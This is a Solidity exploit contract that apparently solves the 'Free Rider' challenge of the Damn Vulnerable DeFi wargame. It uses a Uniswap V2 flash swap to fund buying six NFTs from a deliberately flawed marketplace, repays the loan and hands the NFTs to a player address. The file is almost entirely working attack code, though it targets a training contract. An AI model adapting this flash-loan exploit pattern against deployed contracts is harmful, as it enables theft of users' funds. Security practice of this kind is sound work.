// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
import {Test, console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract FlashSwap is Test , IUniswapV2Callee, IERC721Receiver {
    address pairAddress;
    WETH weth;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;
    address player = makeAddr("player");


    constructor(
        address _pairAddress,
        address payable _weth,
        address payable _marketplace,
        address _recoveryManager,
        address _nft
    ) {
        pairAddress = _pairAddress;
        weth = WETH(_weth);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        nft = DamnValuableNFT(_nft);
    }

    // Function to start the flash swap
    function executeFlashSwap(address tokenBorrow, uint256 amountBorrow) external {
        // Find the pair contract
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);

        // Determine the token to borrow
        address token0 = pair.token0();
        address token1 = pair.token1();
        require(tokenBorrow == token0 || tokenBorrow == token1, "Invalid token");

        // Determine how much to borrow
        uint256 amount0Out = tokenBorrow == token0 ? amountBorrow : 0;
        uint256 amount1Out = tokenBorrow == token1 ? amountBorrow : 0;

        // Initiate the flash swap
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(amountBorrow));
    }

    // This function is called by the pair contract after swap is initiated
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external override {
        // Ensure that this function is only called by the Uniswap pair contract
        require(msg.sender == pairAddress, "Invalid call");

        // Decode the amount borrowed from the data parameter
        uint256 amountBorrow = abi.decode(data, (uint256));

        // Determine the token borrowed and the amount
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        uint256 amountTokenBorrowed = amount0 == 0 ? amount1 : amount0;

        address tokenBorrow = amount0 == 0 ? token1 : token0;

        // We need eth, we withdraw eth
        IERC20(tokenBorrow).approve(address(weth), amountTokenBorrowed);
        weth.withdraw(amountTokenBorrowed);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        marketplace.buyMany{value: amountTokenBorrowed}(tokenIds);

        // Calculate Uniswap swap fee.
        uint256 fee = ((amountTokenBorrowed * 3) / 997) + 1;
        weth.deposit{value: amountTokenBorrowed + fee}();

        // Approve all for the player
        nft.setApprovalForAll(player, true);

        // Repay the pair contract
        IERC20(tokenBorrow).transfer(msg.sender, amountBorrow + fee);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {   
        return IERC721Receiver.onERC721Received.selector;
    }
}
